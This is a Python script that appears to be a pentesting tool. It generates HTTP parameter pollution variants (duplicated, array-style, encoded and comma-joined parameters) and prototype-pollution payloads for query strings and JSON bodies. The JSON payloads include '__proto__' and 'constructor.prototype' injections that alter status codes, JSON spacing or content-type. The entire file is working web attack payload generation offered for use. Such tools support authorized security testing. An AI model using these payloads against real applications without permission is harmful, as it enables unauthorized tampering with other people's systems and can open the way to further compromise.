import sys
import json
import string, random
from argparse import ArgumentParser

def parse_arguments ():
    parser = ArgumentParser("Parameter Pollution Payload Generator")
    parser.add_argument("-p","--parameters", dest="parameters", metavar="", help="Parameters for poisoning")
    parser.add_argument("-j", "--json", dest="json_parameters", metavar="", help="Specify JSON dictionary to poison")
    parser.add_argument("-pp","--prototype-pollution", dest="prototype_pollution", action="store_true", help="Generate Prototype pollution payloads")
    parser.add_argument("--wrap", dest="wrap", action="store_true", help="Wrap Prototype pollution payloads")
    return parser.parse_args()

def generate_random():
    return ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(16))

def duplicate_parameters(input_params):
    if input_params:
        params_len = len(input_params)
        result_params = []

        for param in input_params:
            for i in range(params_len):
                if input_params[i] != param:
                    result_params.append(input_params[i])
                else:
                    result_params.append(param)
                    key = param.split("=",1)[0]
                    result_params.append(f"{key}="+generate_random())
            print("&".join(result_params))
            result_params.clear()

def duplicate_array(input_params):
    if input_params:
        params_len = len(input_params)
        result_params = []

        for param in input_params:
            for i in range(params_len):
                if input_params[i] != param:
                    result_params.append(input_params[i])
                else:
                    result_params.append(param.replace("=","[]="))
                    key = param.split("=",1)[0]
                    result_params.append(f"{key}[]="+generate_random())
            print("&".join(result_params))
            result_params.clear()

def url_encode_first(input_params):
    if input_params:
        params_len = len(input_params)
        result_params = []

        for param in input_params:
            for i in range(params_len):
                if input_params[i] != param:
                    result_params.append(input_params[i])
                else:
                    result_params.append(param)
                    key = param.split("=",1)[0]
                    char = key[:1]
                    encoded = f"%{ord(char):x}"
                    result_params.append(f"{encoded}{key[1:]}="+generate_random())
            print("&".join(result_params))
            result_params.clear()    

def coma_separate_values(input_params):
    if input_params:
        params_len = len(input_params)
        result_params = []

        for param in input_params:
            for i in range(params_len):
                if input_params[i] != param:
                    result_params.append(input_params[i])
                else:
                    key, value = param.split("=",1)
                    random_value = generate_random()
                    result_params.append(f"{key}={value},{random_value}")
            print("&".join(result_params))
            result_params.clear()  


def create_json_arrays(input_params):

    for key in input_params:
        result_dict = dict(input_params)
        value = result_dict[key]
        result_dict[key] = [value, generate_random()]    
        print(json.dumps(result_dict))

def create_nested_dicts(input_params):

    for key in input_params:
        result_dict = dict(input_params)
        value = result_dict[key]
        result_dict[key] = { key : value, "unecpected":generate_random()}    
        print(json.dumps(result_dict))

def prototype_pollution(input_params, wrap_proto = False):
    prototypes = [
        "constructor[prototype][polluted]=UNIQUE",
        "constructor.prototype.polluted=UNIQUE",
        '__proto__[polluted]={"json":"UNIQUE"}',
        "__proto__[polluted]=UNIQUE",
        "__proto__.polluted=UNIQUE",
    ]
    unique = generate_random()

    if input_params:
        if not wrap_proto:
            for proto in prototypes:
                working_list = list(set(input_params))
                working_list.append(proto.replace("UNIQUE",unique))
                print("&".join(working_list))
        else:
            protos = [p.replace("UNIQUE", unique) for p in prototypes]
            working_list = list(set(input_params))
            working_list.extend(protos)
            print("&".join(working_list))

def json_prototype_pollution(input_params):

    unique = generate_random()

    proto = {
        "polluted" : unique
    }

    constructor = {
        "prototype":{
            "polluted": unique
        }   
    }

    working_dict = dict(input_params)
    working_dict["__proto__"] = proto
    print(json.dumps(working_dict))
        
    working_dict = dict(input_params)
    working_dict["__proto__"] = {"polluted":{"json":unique}}
    print(json.dumps(working_dict))

    working_dict = dict(input_params)
    working_dict["__proto__"] = {"status":555}
    print(json.dumps(working_dict))

    working_dict = dict(input_params)
    working_dict["__proto__"] = {"json spaces": 500}
    print(json.dumps(working_dict))
    
    working_dict = dict(input_params)
    working_dict["__proto__"] = {"content-type": "application/json; charset=utf-7", "+AGYAbwBv-": "foo"}
    print(json.dumps(working_dict))


    working_dict = dict(input_params)
    working_dict["constructor"] = constructor
    print(json.dumps(working_dict))
    

def main():

    args = parse_arguments()

    if args.parameters:
        if "&" in args.parameters:
            params = args.parameters.split("&")
        else:
            params = [args.parameters]
            
        duplicate_parameters(params)
        duplicate_array(params)
        url_encode_first(params)
        coma_separate_values(params)
        if args.prototype_pollution:
            wrap = args.wrap if args.wrap else False
            prototype_pollution(params, wrap_proto=wrap)

    if args.json_parameters:
        if args.json_parameters.startswith("{") and args.json_parameters.endswith("}"):
            # try to parse with json
            parsed_data = json.loads(args.json_parameters)
            create_json_arrays(parsed_data)
            create_nested_dicts(parsed_data)
            if args.prototype_pollution:
                json_prototype_pollution(parsed_data)
        else:
            print("[x] The specified value is not a valid json structure!")


    sys.exit(0)

    if len(sys.argv) > 1:
        # read the parameters from the console
        parameters = sys.argv[1]

        if parameters.startswith("{") and parameters.endswith("}"):
            # try to parse with json
            parsed_data = json.loads(parameters)
            create_json_arrays(parsed_data)
            create_nested_dicts(parsed_data)
            json_prototype_pollution(parsed_data)
        
        else:
            if "&" in parameters:
                params = parameters.split("&")
            else:
                params = [parameters]
            
            duplicate_parameters(params)
            duplicate_array(params)
            url_encode_first(params)
            coma_separate_values(params)
            prototype_pollution(params)
        

if __name__ == "__main__":
    main()